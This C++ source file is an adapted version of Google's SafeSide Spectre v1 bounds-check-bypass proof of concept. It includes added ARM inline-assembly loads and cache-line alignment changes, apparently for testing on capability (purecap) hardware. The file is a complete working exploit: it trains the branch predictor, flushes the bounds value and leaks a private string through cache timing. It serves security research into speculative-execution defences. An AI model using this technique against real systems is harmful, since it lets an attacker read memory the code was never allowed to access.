/*
 * Copyright 2019 Google LLC
 *
 * Licensed under both the 3-Clause BSD License and the GPLv2, found in the
 * LICENSE and LICENSE.GPL-2.0 files, respectively, in the root directory.
 *
 * SPDX-License-Identifier: BSD-3-Clause OR GPL-2.0
 */

// Causes misprediction of conditional branches that leads to a bounds check
// being bypassed during speculative execution. Leaks architecturally
// inaccessible data from the process's address space.
//
// PLATFORM NOTES:
// This program should leak data on pretty much any system where it compiles.
// We only require an out-of-order CPU that predicts conditional branches.

#include <array>
#include <cstring>
#include <iostream>
#include <memory>

#include "instr.h"
#include "local_content.h"
#include "timing_array.h"
#include "utils.h"


//added inline assembly functions to test various combinations of:
//capability/pointer for size in bounds check, and capability/pointer for the public data itself

//these are also not general at all, but they work for their specific uses
//could be made better but work to show what happens if pointers are used for size or public data

//sources for inline loads:
//https://forum.arduino.cc/t/referencing-a-pointer-in-inline-assembly/326531
//http://www.ethernut.de/en/documents/arm-inline-asm.html

size_t LoadFromPointer(void* address){
  size_t c = (size_t)address;
  size_t d = 0;
  __asm__ volatile ( "ldr %0, [%1]\n\t" :"=r"(d) :"r" (c) : "memory") ;
  return d;
}


char LoadFromArray(const char* address, size_t offset){
  size_t c = (size_t)address + offset;
  char d = 0;
  __asm__ volatile ( "ldr %0, [%1]\n\t" :"=r"(d) :"r" (c) : "memory") ;
  return d;
}


// Leaks the byte that is physically located at &text[0] + offset, without ever
// loading it. In the abstract machine, and in the code executed by the CPU,
// this function does not load any memory except for what is in the bounds
// of `text`, and local auxiliary data.
//
// Instead, the leak is performed by accessing out-of-bounds during speculative
// execution, bypassing the bounds check by training the branch predictor to
// think that the value will be in-range.
static char LeakByte(const char *data, size_t offset) {
  TimingArray timing_array;
  // The size needs to be unloaded from cache to force speculative execution
  // to guess the result of comparison.
  //
  // TODO(asteinha): since size_in_heap is no longer the only heap-allocated
  // value, it should be allocated into its own unique page
  
  //***START CACHE LINE FLUSH BOUNDS FAULT RESOLUTION***
  
  //original size code
  
  //if this is used to flush a cache line, will cause a bounds fault in purecap mode because the bounds need to cover whole cache line (64 bytes)
  //instead, use aligned_alloc to make sure it is aligned, and bounds cover the whole cache line
  //std::unique_ptr<size_t> size_in_heap = std::unique_ptr<size_t>(
  //    new size_t(strlen(data)));
  
  //std::unique_ptr<size_t> size_in_heap = std::unique_ptr<size_t>(
  //    (size_t*) aligned_alloc(64, 64));

  //changed to use a regular (not unique) size_t pointer to make casting to size_t (to get 8 bytes of address, without capability info) easier
  //need to change code below too to not use .get() as well
  size_t* size_in_heap = (size_t*) aligned_alloc(64, 64);

  //initialize to hold public data string length
  *size_in_heap = strlen(data);
  //***END CACHE LINE FLUSH BOUNDS FAULT RESOLUTION***


  for (int run = 0;; ++run) {
    timing_array.FlushFromCache();
    // We pick a different offset every time so that it's guaranteed that the
    // value of the in-bounds access is usually different from the secret value
    // we want to leak via out-of-bounds speculative access.
    int safe_offset = run % strlen(data);

    // Loop length must be high enough to beat branch predictors.
    // The current length 2048 was established empirically. With significantly
    // shorter loop lengths some branch predictors are able to observe the
    // pattern and avoid branch mispredictions.
    for (size_t i = 0; i < 2048; ++i) {
      // Remove from cache so that we block on loading it from memory,
      // triggering speculative execution.
      //FlushDataCacheLine(size_in_heap.get());
      FlushDataCacheLine(size_in_heap);

      // Train the branch predictor: perform in-bounds accesses 2047 times,
      // and then use the out-of-bounds offset we _actually_ care about on the
      // 2048th time.
      // The local_offset value computation is a branchless equivalent of:
      // size_t local_offset = ((i + 1) % 2048) ? safe_offset : offset;
      // We need to avoid branching even for unoptimized compilation (-O0).
      // Optimized compilations (-O1, concretely -fif-conversion) would remove
      // the branching automatically.
      size_t local_offset =
          offset + (safe_offset - offset) * static_cast<bool>((i + 1) % 2048);

      //if (local_offset < *size_in_heap) {
      if (local_offset < LoadFromPointer(size_in_heap)) {                                                                                                                                                 
        // This branch was trained to always be taken during speculative                                                                                                                                    
        // execution, so it's taken even on the 2048th iteration, when the                                                                                                                                  
        // condition is false!                                                                                                                                                                              
        //ForceRead(&timing_array[data[local_offset]]);
        ForceRead(&timing_array[LoadFromArray(data, local_offset)]);                                                                                                                                      
      }
    }

    int ret = timing_array.FindFirstCachedElementIndexAfter(data[safe_offset]);
    if (ret >= 0 && ret != data[safe_offset]) {
      return ret;
    }

    if (run > 100000) {
      std::cerr << "Does not converge" << std::endl;
      exit(EXIT_FAILURE);
    }
  }
}

int main() {
  std::cout << "Leaking the string: ";
  std::cout.flush();
  const size_t private_offset = private_data - public_data;
  for (size_t i = 0; i < strlen(private_data); ++i) {
    // On at least some machines, this will print the i'th byte from
    // private_data, despite the only actually-executed memory accesses being
    // to valid bytes in public_data.
    std::cout << LeakByte(public_data, private_offset + i);
    std::cout.flush();
  }
  std::cout << "\nDone!\n";
}
